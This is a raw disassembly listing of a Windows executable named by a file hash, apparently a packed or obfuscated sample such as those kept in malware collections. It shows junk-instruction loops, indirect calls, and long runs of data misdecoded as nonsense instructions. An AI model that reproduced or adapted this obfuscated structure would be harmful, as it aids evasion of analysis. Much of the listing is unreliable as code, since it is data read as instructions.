
2fb0a620b0860e90c43b66d1ec9fc708579fa13e15559b67809952d115a74c2d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	sbb    DWORD PTR ds:0x43460b,ecx
  40100c:	mov    eax,ds:0x414afe
  401011:	mov    eax,DWORD PTR [eax+0x198]
  401017:	mov    DWORD PTR [ebp-0x8],eax
  40101a:	add    eax,DWORD PTR ds:0x4344e3
  401020:	mov    eax,DWORD PTR [ebp+0x8]
  401023:	dec    DWORD PTR ds:0x434553
  401029:	mov    ecx,DWORD PTR [ebp-0x8]
  40102c:	sbb    DWORD PTR ds:0x4344f3,0x434547
  401036:	push   ebx
  401037:	push   esi
  401038:	sub    DWORD PTR ds:0x43460b,ebx
  40103e:	mov    esi,0x7510851
  401043:	mov    DWORD PTR ds:0x43453b,0x10
  40104d:	cmp    DWORD PTR ds:0x43453b,0x0
  401054:	je     0x4010ad
  40105a:	cmp    DWORD PTR ds:0x43453b,0x2
  401061:	jne    0x40107b
  401067:	push   DWORD PTR [ebp-0x1c]
  40106a:	push   DWORD PTR [ebp-0x18]
  40106d:	push   DWORD PTR [ebp-0x24]
  401070:	push   0x7fb5
  401075:	call   DWORD PTR ds:0x4130b4
  40107b:	cmp    DWORD PTR ds:0x43453b,0x3
  401082:	jne    0x401095
  401088:	mov    ebx,DWORD PTR ds:0x43453b
  40108e:	dec    ebx
  40108f:	mov    DWORD PTR ds:0x43453b,ebx
  401095:	mov    ebx,DWORD PTR ds:0x43453b
  40109b:	dec    ebx
  40109c:	mov    DWORD PTR ds:0x43453b,ebx
  4010a2:	jmp    0x40104d
  4010a7:	adc    DWORD PTR ds:0x43460f,ecx
  4010ad:	xor    eax,esi
  4010af:	push   edi
  4010b0:	mov    edi,DWORD PTR ds:0x43455f
  4010b6:	mov    ebx,DWORD PTR ds:0x434633
  4010bc:	sub    ebx,edi
  4010be:	imul   edi,DWORD PTR [edi+ebx*1]
  4010c2:	mov    edi,0x327299
  4010c7:	adc    DWORD PTR ds:0x434507,0x43458b
  4010d1:	add    eax,edi
  4010d3:	and    DWORD PTR ds:0x43458f,0x0
  4010dd:	jmp    0x4010ef
  4010e2:	mov    ebx,DWORD PTR ds:0x43458f
  4010e8:	inc    ebx
  4010e9:	mov    DWORD PTR ds:0x43458f,ebx
  4010ef:	cmp    DWORD PTR ds:0x43458f,0x1d
  4010f6:	jae    0x401312
  4010fc:	cmp    DWORD PTR ds:0x43458f,0xe
  401103:	jne    0x401119
  401109:	push   0x4344eb
  40110e:	push   0x43485b
  401113:	call   DWORD PTR ds:0x41332c
  401119:	cmp    DWORD PTR ds:0x43458f,0xd
  401120:	jne    0x401133
  401126:	mov    ebx,DWORD PTR ds:0x43458f
  40112c:	inc    ebx
  40112d:	mov    DWORD PTR ds:0x43458f,ebx
  401133:	jmp    0x4010e2
  401138:	or     DWORD PTR ds:0x4344eb,ebx
  40113e:	jmp    0x401312
  401143:	test   ah,ch
  401145:	push   edx
  401146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401147:	jb     0x4010fd
  401149:	jl     0x401137
  40114b:	pop    eax
  40114c:	or     eax,0xe17e1829
  401151:	mov    ah,0x86
  401153:	jle    0x4011d3
  401155:	jle    0x4011d5
  401157:	mov    ch,0x7f
  401159:	jle    0x4011d9
  40115b:	into   
  40115c:	xlat   BYTE PTR ds:[ebx]
  40115d:	cmp    ecx,edx
  40115f:	(bad)
  401162:	(bad)  
  401164:	pop    es
  401165:	add    BYTE PTR [ebx],al
  401167:	shufps xmm1,XMMWORD PTR [edi+ecx*1],0x33
  40116c:	bswap  esp
  40116e:	and    al,0xc7
  401170:	sbb    al,0x1f
  401172:	inc    ebp
  401173:	fs or  al,0xb7
  401176:	(bad)  [esi]
  401178:	out    dx,eax
  401179:	mov    ecx,0x8e03d6db
  40117e:	es mov esi,0x114da2f0
  401184:	test   eax,0x661f46de
  401189:	call   0x985d1cfd
  40118e:	add    al,0xd6
  401190:	dec    esp
  401191:	stos   BYTE PTR es:[edi],al
  401192:	push   ebx
  401193:	sub    ebp,ebx
  401195:	sar    BYTE PTR [eax],0xa9
  401198:	mov    bh,BYTE PTR [ebx-0x3f]
  40119b:	stos   DWORD PTR es:[edi],eax
  40119c:	push   es
  40119d:	rcl    bl,0x8d
  4011a0:	test   esi,edx
  4011a2:	pushf  
  4011a3:	(bad)
  4011a6:	mov    esi,ebp
  4011a8:	dec    edi
  4011a9:	out    0xa6,al
  4011ab:	dec    ebp
  4011ac:	call   DWORD PTR [edi-0x254af85c]
  4011b2:	mov    ecx,0x5136e949
  4011b7:	and    esi,DWORD PTR [edx-0x47619116]
  4011bd:	jnp    0x4011dc
  4011bf:	ret    
  4011c0:	xchg   edx,eax
  4011c1:	sub    eax,0xc25eebd0
  4011c6:	loopne 0x40120c
  4011c8:	cld    
  4011c9:	jmp    0xd761:0x70cf3d92
  4011d0:	sub    al,0xc9
  4011d2:	add    ah,ch
  4011d4:	sbb    eax,0x331a65d
  4011d9:	outs   dx,DWORD PTR ds:[esi]
  4011da:	ins    DWORD PTR es:[edi],dx
  4011db:	add    al,0x14
  4011dd:	cmp    eax,0x34508ed9
  4011e2:	jno    0x401263
  4011e4:	(bad)
  4011e9:	or     ebx,DWORD PTR [ebx+0x51]
  4011ec:	(bad)  
  4011ee:	adc    eax,0x25e558d3
  4011f3:	jge    0x401193
  4011f5:	inc    esi
  4011f6:	dec    ebx
  4011f7:	aaa    
  4011f8:	adc    DWORD PTR [ebx],ebp
  4011fa:	ja     0x401231
  4011fc:	sbb    dl,bl
  4011fe:	ds dec edi
  401200:	hlt    
  401201:	leave  
  401202:	mov    al,ds:0xc73c2c9f
  401207:	dec    esp
  401208:	adc    eax,0xa24226ee
  40120d:	imul   edi,ebp,0xffffffdd
  401210:	inc    ebx
  401211:	shl    DWORD PTR [esi+0x47b0bfc7],cl
  401217:	ds add ch,dh
  40121a:	popa   
  40121b:	and    ebp,ebp
  40121d:	dec    esp
  40121e:	mov    WORD PTR [edx],fs
  401220:	push   eax
  401221:	in     eax,0x82
  401223:	test   DWORD PTR [esi],edi
  401225:	fidiv  WORD PTR [ebx+0x7f]
  401228:	xchg   ecx,eax
  401229:	aas    
  40122a:	inc    esi
  40122b:	(bad)  
  40122c:	pop    edi
  40122d:	mov    esp,0xaaed786a
  401232:	into   
  401233:	mov    eax,ds:0x9e15eb
  401238:	push   ds
  401239:	jmp    0x40127f
  40123b:	shl    esp,1
  40123d:	in     eax,dx
  40123e:	sub    eax,0xc6b87c77
  401243:	jmp    0x401203
  401245:	mov    ebp,0xe5b116eb
  40124a:	mov    edi,0xbee3dfd6
  40124f:	xchg   ecx,eax
  401250:	xlat   BYTE PTR ds:[ebx]
  401251:	retf   
  401252:	pop    es
  401253:	cmp    eax,0x80af9102
  401258:	cmp    al,0x1e
  40125a:	or     BYTE PTR [ebx-0x48],ah
  40125d:	shl    DWORD PTR [esi+0x59],0x9
  401261:	jbe    0x4012db
  401263:	xor    al,0xad
  401265:	or     bh,BYTE PTR [edx+ecx*2]
  401268:	mov    ds:0x2c159f45,eax
  40126d:	jbe    0x401226
  40126f:	mov    bl,0x9d
  401271:	push   ebp
  401272:	loopne 0x401210
  401274:	dec    ebp
  401275:	inc    esp
  401276:	xchg   ecx,eax
  401277:	or     eax,0xcdb7ad6e
  40127c:	imul   esp,DWORD PTR [ecx-0x57ee0ab0],0x550132ec
  401286:	xchg   ebp,eax
  401287:	je     0x4012fd
  401289:	mov    DWORD PTR [ebx+ecx*4],ebp
  40128c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40128d:	sub    eax,edi
  40128f:	in     eax,0x6d
  401291:	mov    esp,0x95f36e7
  401296:	aaa    
  401297:	jmp    0x602861ac
  40129c:	add    dl,BYTE PTR [ebx]
  40129e:	test   BYTE PTR [eax-0x6e],dh
  4012a1:	arpl   WORD PTR ds:0x68f58dd,si
  4012a7:	push   0xfe09bc51
  4012ac:	mov    ?,WORD PTR [edi-0x6a]
  4012af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012b0:	ins    BYTE PTR es:[edi],dx
  4012b1:	cwde   
  4012b2:	dec    ecx
  4012b3:	xchg   edx,eax
  4012b4:	mov    ds:0x348083f,al
  4012b9:	or     dh,BYTE PTR [esi+0x19ae43c0]
  4012bf:	or     BYTE PTR [edx-0x9f64b8d],dh
  4012c5:	sub    ecx,DWORD PTR [edx-0x7c]
  4012c8:	xchg   ebx,eax
  4012c9:	inc    ebx
  4012ca:	adc    al,0x72
  4012cc:	ins    BYTE PTR es:[edi],dx
  4012cd:	add    DWORD PTR [eax-0x7dea866b],ebp
  4012d3:	inc    ecx
  4012d4:	mov    ecx,0x84b30575
  4012d9:	sub    edx,DWORD PTR [eax+edx*8+0x39552d72]
  4012e0:	cmp    BYTE PTR [edi-0xff8fcc0],dh
  4012e6:	xor    eax,0xc5bf218
  4012eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012ec:	mov    dl,0xee
  4012ee:	in     eax,dx
  4012ef:	or     esp,DWORD PTR [ecx+0x11c8a7c1]
  4012f5:	inc    ecx
  4012f7:	inc    edi
  4012f8:	xor    BYTE PTR [edx-0x1710fe17],cl
  4012fe:	mov    ?,WORD PTR [edi-0x12]
  401301:	call   0xf46:0x8d3e079b
  401308:	mov    ecx,0x2f5c8a73
  40130d:	cmp    eax,0xcfd89447
  401312:	mov    DWORD PTR [ecx],eax
  401314:	adc    ecx,0x1222
  40131a:	lea    eax,[ebp-0x4]
  40131d:	xor    DWORD PTR ds:0x43457f,0x53dc
  401327:	mov    DWORD PTR [ebp-0x10],eax
  40132a:	adc    DWORD PTR ds:0x43453f,edi
  401330:	mov    eax,DWORD PTR [ebp+0x8]
  401333:	or     DWORD PTR ds:0x4344ef,0x4344e3
  40133d:	mov    ecx,DWORD PTR [ebp-0x10]
  401340:	xor    DWORD PTR ds:0x4344f3,ebx
  401346:	xor    eax,esi
  401348:	neg    ebx
  40134a:	add    eax,edi
  40134c:	mov    DWORD PTR [ecx],eax
  40134e:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  401355:	lea    eax,[ebp-0x14]
  401358:	sbb    ecx,ecx
  40135a:	mov    DWORD PTR [ebp-0x20],eax
  40135d:	mov    eax,DWORD PTR [ebp-0x14]
  401360:	mov    ecx,DWORD PTR [ebp-0x20]
  401363:	and    DWORD PTR ds:0x4345c3,0x0
  40136d:	xor    ebx,ebx
  40136f:	add    ebx,DWORD PTR ds:0x4345c3
  401375:	inc    ebx
  401376:	mov    DWORD PTR ds:0x4345c3,ebx
  40137c:	cmp    DWORD PTR ds:0x4345c3,0x9
  401383:	jne    0x401394
  401389:	push   0x3702
  40138e:	call   DWORD PTR ds:0x4130b8
  401394:	cmp    DWORD PTR ds:0x4345c3,0x8
  40139b:	jne    0x4013ae
  4013a1:	mov    ebx,DWORD PTR ds:0x4345c3
  4013a7:	inc    ebx
  4013a8:	mov    DWORD PTR ds:0x4345c3,ebx
  4013ae:	cmp    DWORD PTR ds:0x4345c3,0x1c
  4013b5:	jb     0x40136d
  4013bb:	add    DWORD PTR ds:0x43453f,ecx
  4013c1:	xor    eax,esi
  4013c3:	add    eax,edi
  4013c5:	mov    DWORD PTR [ecx],eax
  4013c7:	dec    DWORD PTR ds:0x43458b
  4013cd:	mov    eax,ds:0x414bd2
  4013d2:	mov    ebx,0x8e12febf
  4013d7:	mov    DWORD PTR [ebp-0xc],ebx
  4013da:	sbb    DWORD PTR ds:0x4344ef,0x43453f
  4013e4:	mov    eax,DWORD PTR [eax]
  4013e6:	adc    DWORD PTR ds:0x4344eb,0x4345f7
  4013f0:	mov    cx,WORD PTR [ebp-0x4]
  4013f4:	xor    DWORD PTR ds:0x434503,0x1391
  4013fe:	movzx  ecx,cx
  401401:	add    ecx,DWORD PTR [eax]
  401403:	mov    DWORD PTR [ebp-0x18],ecx
  401406:	jmp    0x4015da
  40140b:	fisub  DWORD PTR [esi]
  40140d:	add    BYTE PTR [ecx],0x42
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	gs in  eax,dx
  401413:	aam    0x1e
  401415:	dec    edx
  401416:	xchg   DWORD PTR [ebp-0x4abffabf],eax
  40141c:	jg     0x40149c
  40141e:	jle    0x4013d5
  401420:	jg     0x4014a0
  401422:	jle    0x401421
  401424:	pop    edi
  401425:	icebp  
  401426:	or     DWORD PTR [edi-0x43],esp
  401429:	pop    DWORD PTR [ecx-0x55]
  40142c:	ds scas eax,DWORD PTR es:[edi]
  40142e:	nop
  40142f:	frstor [edi+0x77]
  401432:	mov    esi,0xd33b9e9b
  401437:	mov    dh,0xf7
  401439:	ret    
  40143a:	inc    esi
  40143b:	mov    edx,ebx
  40143d:	add    DWORD PTR [ebx+0x20],0xfffffff1
  401441:	mov    ah,0x58
  401443:	test   DWORD PTR [edx-0x6],eax
  401446:	pop    edi
  401447:	enter  0xfb7,0x3c
  40144b:	jecxz  0x40148e
  40144d:	and    eax,0x7746456
  401452:	lds    edi,FWORD PTR [ebx]
  401454:	add    al,0x37
  401456:	fcomi  st,st(5)
  401458:	es retf 
  40145a:	int    0x30
  40145c:	mov    edx,0x36373b11
  401461:	or     al,0x76
  401463:	mov    eax,ds:0xb82f1575
  401468:	(bad)  
  401469:	and    BYTE PTR ds:0x17349f39,bl
  40146f:	dec    edi
  401470:	inc    ebp
  401471:	lahf   
  401472:	adc    eax,ebp
  401474:	adc    DWORD PTR [eax],eax
  401476:	lods   al,BYTE PTR ds:[esi]
  401477:	pop    es
  401478:	mov    ss,WORD PTR [esp+eax*1]
  40147b:	fldcw  WORD PTR [ecx-0x6ff2bef9]
  401481:	jle    0x4014ce
  401483:	mov    BYTE PTR [bp-0x3b],0x0
  401488:	scas   al,BYTE PTR es:[edi]
  401489:	dec    esi
  40148a:	xchg   esp,eax
  40148b:	inc    edx
  40148c:	ja     0x40141a
  40148e:	jne    0x401446
  401490:	into   
  401491:	xor    al,0xb4
  401493:	jmp    DWORD PTR [edx+0x64673522]
  401499:	lods   al,BYTE PTR ds:[esi]
  40149a:	dec    edi
  40149b:	test   eax,0x137a41f
  4014a0:	mov    bh,0xd3
  4014a2:	xor    ebx,DWORD PTR [esi+0x31046ed6]
  4014a8:	pop    ds
  4014a9:	mov    ebp,0xbd429a1c
  4014ae:	stos   DWORD PTR es:[edi],eax
  4014af:	push   eax
  4014b0:	fld    DWORD PTR es:[ebx+0x68f0f267]
  4014b7:	sub    DWORD PTR [esi-0x3b],ebx
  4014ba:	fwait
  4014bb:	lods   al,BYTE PTR cs:[esi]
  4014bd:	mov    ds,WORD PTR [ecx-0x526f317f]
  4014c3:	fcomp  DWORD PTR [edi]
  4014c5:	test   al,0x55
  4014c7:	pop    ebx
  4014c8:	push   ebx
  4014c9:	imul   esi,DWORD PTR [esi+0x7f],0x82a622ac
  4014d0:	dec    ebx
  4014d1:	mov    dl,0xf2
  4014d3:	and    DWORD PTR [esi-0x4],edx
  4014d6:	cmp    al,BYTE PTR [esi]
  4014d8:	jns    0x4014b2
  4014da:	adc    al,0xad
  4014dc:	(bad)  
  4014de:	stc    
  4014df:	fnstenv [eax-0x38021219]
  4014e5:	or     eax,0xc754d11c
  4014ea:	jle    0x401547
  4014ec:	cwde   
  4014ed:	rol    DWORD PTR [ebp+0x44],cl
  4014f0:	add    DWORD PTR [esi+esi*1+0x76],0x31
  4014f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014f6:	or     eax,0xfa4de5a0
  4014fb:	jecxz  0x40155e
  4014fd:	ds mov ecx,0xd1308d38
  401503:	jp     0x401548
  401505:	sbb    eax,DWORD PTR [edi+0x20]
  401508:	je     0x4014a2
  40150a:	or     DWORD PTR [edx+esi*4+0x66],ebp
  40150e:	sub    DWORD PTR [ebp+0x5c],esp
  401511:	or     al,BYTE PTR [edx-0x28d93a75]
  401517:	xchg   BYTE PTR [eax+0x17],ch
  40151a:	cmp    DWORD PTR [ecx-0x2d],esp
  40151d:	int3   
  40151e:	popf   
  40151f:	add    DWORD PTR [edx],eax
  401521:	adc    eax,0xb7e779e0
  401526:	daa    
  401527:	out    0x46,eax
  401529:	pop    ecx
  40152a:	and    BYTE PTR [ecx-0x27],ch
  40152d:	dec    ebp
  40152e:	or     ah,BYTE PTR [esi+ecx*1-0x61]
  401532:	mov    eax,ds:0xf4bb1ceb
  401537:	mov    edi,0x55648bc
  40153c:	add    eax,0x9b0e5ce8
  401541:	sbb    al,BYTE PTR [ebx+0x4ea03c2a]
  401547:	in     al,0x91
  401549:	mov    al,ds:0x2b02f095
  40154e:	xchg   ebp,eax
  40154f:	and    DWORD PTR [edi],0xd1a535d3
  401555:	inc    edi
  401556:	lds    ecx,FWORD PTR [ebx-0x1a278dbe]
  40155c:	fcom   st(4)
  40155e:	fmul   st(7),st
  401560:	mov    DWORD PTR [eax+0x4d],0x70eb29ff
  401567:	outs   dx,BYTE PTR ds:[esi]
  401568:	(bad)  
  401569:	adc    al,0x43
  40156b:	sbb    esi,ebp
  40156d:	mov    edx,0x5945f94
  401572:	add    al,ah
  401574:	jl     0x401534
  401576:	enter  0xc14d,0xd3
  40157a:	pop    eax
  40157b:	mov    ah,0xad
  40157d:	js     0x401520
  40157f:	lods   al,BYTE PTR ds:[esi]
  401580:	xor    BYTE PTR [ebx+0x6ad5f1c2],0x19
  401587:	xchg   DWORD PTR [ebx+0x2b65e3ce],eax
  40158d:	lods   eax,DWORD PTR ds:[esi]
  40158e:	sbb    ebp,DWORD PTR [edi+0x10a13a95]
  401594:	mov    bh,0x81
  401596:	inc    esi
  401597:	jnp    0x4015c1
  401599:	arpl   WORD PTR [edi+ebp*8-0x45],bx
  40159d:	sub    DWORD PTR [edx-0x60db03c3],0xd66767a0
  4015a7:	mov    BYTE PTR fs:0xa0e327f9,bh
  4015ae:	push   edi
  4015af:	std    
  4015b0:	dec    edx
  4015b1:	test   BYTE PTR [ecx+ebp*1],0xdc
  4015b5:	xchg   edx,eax
  4015b6:	jbe    0x40154d
  4015b8:	push   ss
  4015b9:	adc    BYTE PTR [esi],cl
  4015bb:	loopne 0x401618
  4015bd:	ret    0x7e20
  4015c0:	sub    al,0x2d
  4015c2:	or     al,bl
  4015c4:	fs jp  0x4015f4
  4015c7:	out    dx,eax
  4015c8:	pop    ebx
  4015c9:	loope  0x401594
  4015cb:	iret   
  4015cc:	push   ss
  4015cd:	xchg   ebp,eax
  4015ce:	std    
  4015cf:	mov    ebp,0x80739743
  4015d4:	push   ebp
  4015d5:	pop    edi
  4015d6:	retf   
  4015d7:	inc    ecx
  4015d8:	ja     0x401569
  4015da:	mov    eax,DWORD PTR [ebp+0x8]
  4015dd:	mov    ecx,DWORD PTR ds:0x43460f
  4015e3:	and    DWORD PTR ds:0x4345bf,ecx
  4015e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4015ec:	xor    eax,esi
  4015ee:	add    DWORD PTR ds:0x4344e3,0x598
  4015f8:	add    eax,edi
  4015fa:	mov    DWORD PTR ds:0x434543,0x7c6b
  401604:	cmp    DWORD PTR [ecx],eax
  401606:	mov    DWORD PTR ds:0x434593,0x6dd9
  401610:	jne    0x40227a
  401616:	and    DWORD PTR ds:0x434583,0x0
  401620:	mov    ecx,DWORD PTR ds:0x434583
  401626:	inc    ecx
  401627:	mov    DWORD PTR ds:0x434583,ecx
  40162d:	cmp    DWORD PTR ds:0x434583,0x4
  401634:	jne    0x401645
  40163a:	push   0x2f81
  40163f:	call   DWORD PTR ds:0x413270
  401645:	cmp    DWORD PTR ds:0x434583,0x3
  40164c:	jne    0x40165f
  401652:	mov    ecx,DWORD PTR ds:0x434583
  401658:	inc    ecx
  401659:	mov    DWORD PTR ds:0x434583,ecx
  40165f:	cmp    DWORD PTR ds:0x434583,0x14
  401666:	jb     0x401620
  40166c:	xor    ecx,ecx
  40166e:	or     ecx,DWORD PTR ds:0x434523
  401674:	mov    eax,ds:0x43456b
  401679:	sub    eax,ecx
  40167b:	and    ecx,DWORD PTR [ecx+eax*1]
  40167e:	mov    eax,DWORD PTR [ebp+0x8]
  401681:	mov    ecx,DWORD PTR [ebp-0x18]
  401684:	add    DWORD PTR ds:0x4345cb,0x4345f7
  40168e:	xor    eax,esi
  401690:	or     DWORD PTR ds:0x4344eb,0x526e
  40169a:	add    eax,edi
  40169c:	mov    DWORD PTR ds:0x4344ef,0x6068
  4016a6:	cmp    DWORD PTR [ecx],eax
  4016a8:	jmp    0x40187c
  4016ad:	cmp    dh,BYTE PTR [esi]
  4016af:	sub    eax,0x6255fdb9
  4016b4:	mov    ebp,0xf85a51d5
  4016b9:	xor    BYTE PTR [edi+0x79ec2f73],dh
  4016bf:	jle    0x40173f
  4016c1:	mov    ch,0x7f
  4016c3:	jle    0x401743
  4016c5:	pop    esp
  4016c6:	mov    ah,0xbb
  4016c8:	retf   0x69a2
  4016cb:	mov    ch,0x59
  4016cd:	rol    DWORD PTR [ebx-0x72],0x1d
  4016d1:	pop    edi
  4016d2:	jno    0x401705
  4016d4:	xchg   edi,eax
  4016d5:	and    ebp,eax
  4016d7:	pop    edx
  4016d8:	dec    edi
  4016d9:	dec    esi
  4016da:	mov    al,ds:0x59938e
  4016df:	add    BYTE PTR [edi],0x39
  4016e2:	or     BYTE PTR [edx],ch
  4016e4:	sbb    DWORD PTR [esp+esi*2+0x58],eax
  4016e8:	dec    esp
  4016e9:	adc    BYTE PTR [eax-0x18],cl
  4016ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016ed:	push   edx
  4016ee:	(bad)  
  4016f0:	int3   
  4016f1:	sub    eax,0xf4232a99
  4016f6:	sub    BYTE PTR [ebp*8+0x47e877c6],bl
  4016fd:	int3   
  4016fe:	test   al,0xf3
  401700:	push   ss
  401701:	pop    eax
  401702:	mov    bl,0xa5
  401704:	fnstcw WORD PTR [ecx-0x619c9b9e]
  40170a:	mov    al,0x6b
  40170c:	sahf   
  40170d:	nop
  40170e:	xchg   esp,eax
  40170f:	jbe    0x401734
  401711:	fcmovbe st,st(0)
  401713:	je     0x40175e
  401715:	sahf   
  401716:	cmp    eax,0x9101d9d3
  40171b:	xor    BYTE PTR cs:[edi+0x61095627],dh
  401722:	stc    
  401723:	mov    ah,0x32
  401725:	push   ecx
  401726:	push   eax
  401727:	add    esp,DWORD PTR [ebp+edi*8-0x364648e2]
  40172e:	adc    eax,ebp
  401730:	jns    0x401777
  401732:	xor    ah,BYTE PTR [edi-0x5a]
  401735:	mov    edx,0xdd4f62c8
  40173a:	sbb    DWORD PTR [ebp-0x10],eax
  40173d:	jecxz  0x401794
  40173f:	ins    BYTE PTR es:[edi],dx
  401740:	adc    edi,ecx
  401742:	inc    ecx
  401743:	mov    al,0xee
  401745:	jo     0x4016cf
  401747:	sbb    edi,0x8e8488ac
  40174d:	jg     0x4017ac
  40174f:	mov    ds:0xd1b2b5bf,eax
  401754:	cmp    DWORD PTR [esi-0x5e],esi
  401757:	lea    ebx,[edx+0x2d70c83e]
  40175d:	inc    esp
  40175e:	mov    gs,WORD PTR [edx-0x79]
  401761:	cmovno edx,DWORD PTR [eax]
  401764:	shr    DWORD PTR [esi],1
  401766:	int    0x1c
  401768:	add    eax,0x36986294
  40176d:	pusha  
  40176e:	mov    eax,ds:0xafd9771f
  401773:	jae    0x4017ba
  401775:	and    ch,ch
  401777:	inc    edi
  401778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401779:	xchg   BYTE PTR [edi+0x64],cl
  40177c:	shl    BYTE PTR [edi],0x68
  40177f:	inc    ecx
  401780:	jle    0x4017d9
  401782:	inc    ecx
  401783:	ror    DWORD PTR [eax-0x6fddf882],cl
  401789:	cmp    eax,0xc340111d
  40178e:	sub    al,BYTE PTR [ecx+0x3661678a]
  401794:	xchg   DWORD PTR [ecx],esp
  401796:	sub    al,0xfb
  401798:	push   0x2e
  40179a:	jl     0x40180c
  40179c:	dec    edi
  40179d:	jns    0x401736
  40179f:	xor    esi,DWORD PTR [ebx-0x194dc1d9]
  4017a5:	jne    0x4017a0
  4017a7:	out    0x7a,eax
  4017a9:	out    0x8f,al
  4017ab:	imul   esi,esp,0x12
  4017ae:	addr16 and bh,0x3b
  4017b2:	leave  
  4017b3:	mov    al,0x11
  4017b5:	mov    eax,ds:0xd975d7d
  4017ba:	xchg   DWORD PTR [edi-0x42],ebx
  4017bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017be:	repz cmp BYTE PTR [esi-0x42],0xf9
  4017c3:	aaa    
  4017c4:	call   0x5596:0x879bfe73
  4017cb:	jmp    0x401839
  4017cd:	in     eax,0xf8
  4017cf:	in     al,0x8f
  4017d1:	push   edi
  4017d2:	mov    cs,WORD PTR [ecx]
  4017d4:	xor    eax,0x528f4a77
  4017d9:	mov    ah,0xd
  4017db:	xor    eax,0xe2d5dd5c
  4017e0:	out    0xba,al
  4017e2:	push   edx
  4017e3:	in     eax,0xbc
  4017e5:	sbb    DWORD PTR [edx+eiz*1+0x13],esi
  4017e9:	icebp  
  4017ea:	cwde   
  4017eb:	pop    ds
  4017ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017ed:	enter  0x39fa,0x2f
  4017f1:	mov    bl,0xe5
  4017f3:	imul   BYTE PTR [ebx]
  4017f5:	adc    DWORD PTR [edx],0xb2e2527d
  4017fb:	in     al,dx
  4017fc:	clc    
  4017fd:	mov    ds:0xc4bf340d,al
  401802:	leave  
  401803:	int    0x4
  401805:	sti    
  401806:	imul   ebp,DWORD PTR [esi],0xeec4a11f
  40180c:	mov    esp,ebx
  40180e:	dec    esi
  40180f:	jmp    0x28d:0x158c4d6b
  401816:	aam    0x6c
  401818:	into   
  401819:	or     ch,BYTE PTR [edi+0x68]
  40181c:	fcomp  QWORD PTR gs:[ebp+0x6e900601]
  401823:	inc    edi
  401824:	(bad)  
  401825:	lods   al,BYTE PTR ds:[esi]
  401826:	add    cl,bl
  401828:	sub    DWORD PTR [eax],ecx
  40182a:	mov    dl,0x15
  40182c:	adc    ecx,edi
  40182e:	sbb    BYTE PTR [esi-0x2a4ae43d],dh
  401834:	xor    al,0xae
  401836:	das    
  401837:	sub    DWORD PTR [esi],esp
  401839:	(bad)  
  40183a:	dec    ebx
  40183b:	push   ebp
  40183c:	mov    ebx,0x84de4006
  401841:	test   DWORD PTR [edi+eiz*2-0x68],eax
  401845:	mov    al,BYTE PTR [esi]
  401847:	jnp    0x4017e7
  401849:	adc    BYTE PTR [ecx+esi*4],ah
  40184c:	push   ebp
  40184d:	popa   
  40184e:	dec    edi
  40184f:	xrelease mov DWORD PTR [ebx],esi
  401852:	pop    ebx
  401853:	sbb    ax,0xf7f4
  401857:	cdq    
  401858:	dec    esi
  401859:	ins    BYTE PTR es:[edi],dx
  40185a:	xchg   DWORD PTR [edi],edx
  40185c:	and    BYTE PTR [ebx-0x7c],dl
  40185f:	pop    eax
  401860:	bound  ecx,QWORD PTR [ecx]
  401862:	sub    eax,0x1e277dae
  401867:	xor    al,0xeb
  401869:	ficomp WORD PTR [edi]
  40186b:	call   0x62c1:0xbeead5d3
  401872:	js     0x401813
  401874:	mov    ah,0x45
  401876:	fild   QWORD PTR [ecx+0x4f]
  401879:	and    DWORD PTR [esi],eax
  40187b:	push   ecx
  40187c:	jne    0x401ca9
  401882:	mov    ecx,DWORD PTR ds:0x434603
  401888:	or     DWORD PTR ds:0x4344e3,ecx
  40188e:	jmp    0x401a62
  401893:	or     esi,DWORD PTR [edi+eiz*2-0x2a]
  401897:	popa   
  401898:	(bad)  [ebx+0x728b6c7d]
  40189e:	sbb    BYTE PTR [eax+0x1b9a9482],cl
  4018a4:	jnp    0x401924
  4018a6:	jle    0x40185d
  4018a8:	jg     0x401928
  4018aa:	jle    0x401909
  4018ac:	xor    ebp,DWORD PTR [eax]
  4018ae:	mov    ds:0xdf8dc97,eax
  4018b3:	cdq    
  4018b4:	pop    ss
  4018b5:	sub    DWORD PTR [edx+0x3a],esi
  4018b8:	jne    0x401873
  4018ba:	cmc    
  4018bb:	and    DWORD PTR [ebp-0xb],esi
  4018be:	or     dh,BYTE PTR [ebx+0x1a663b5b]
  4018c4:	xchg   esp,ebp
  4018c6:	(bad)  
  4018c8:	dec    esp
  4018c9:	out    0x5,al
  4018cb:	push   ebx
  4018cc:	xchg   ebp,eax
  4018cd:	sub    al,0x9c
  4018cf:	xor    edi,eax
  4018d1:	pop    edi
  4018d2:	lds    edx,FWORD PTR [ebx+0x60c95599]
  4018d8:	ss xchg edi,esi
  4018db:	shl    BYTE PTR [ebx+0x3],0x42
  4018df:	sbb    BYTE PTR [esi],0x55
  4018e2:	push   0x7fbe3869
  4018e7:	shl    edi,0x86
  4018ea:	mov    esi,DWORD PTR [edi+0x5f635616]
  4018f0:	mov    ebx,0xc6658643
  4018f5:	push   edi
  4018f6:	cmc    
  4018f7:	cmp    eax,0x27c7ebd9
  4018fc:	outs   dx,BYTE PTR ds:[esi]
  4018fd:	shl    BYTE PTR [ecx+0x53cec560],cl
  401903:	add    al,0x38
  401905:	cs mov esi,0x9fb17751
  40190b:	adc    DWORD PTR [ecx+0x1a],eax
  40190e:	pop    ebp
  40190f:	mov    al,0x92
  401911:	push   0x6a
  401913:	mov    edx,0x4dbb9ba8
  401918:	mov    ds:0x6b9b12f3,eax
  40191d:	inc    esp
  40191e:	and    edi,0x57
  401921:	mov    eax,ds:0xe82e9d76
  401926:	pop    ebp
  401927:	xor    al,0x45
  401929:	fdivr  QWORD PTR [ecx+0x438230a0]
  40192f:	stos   DWORD PTR es:[edi],eax
  401930:	inc    edi
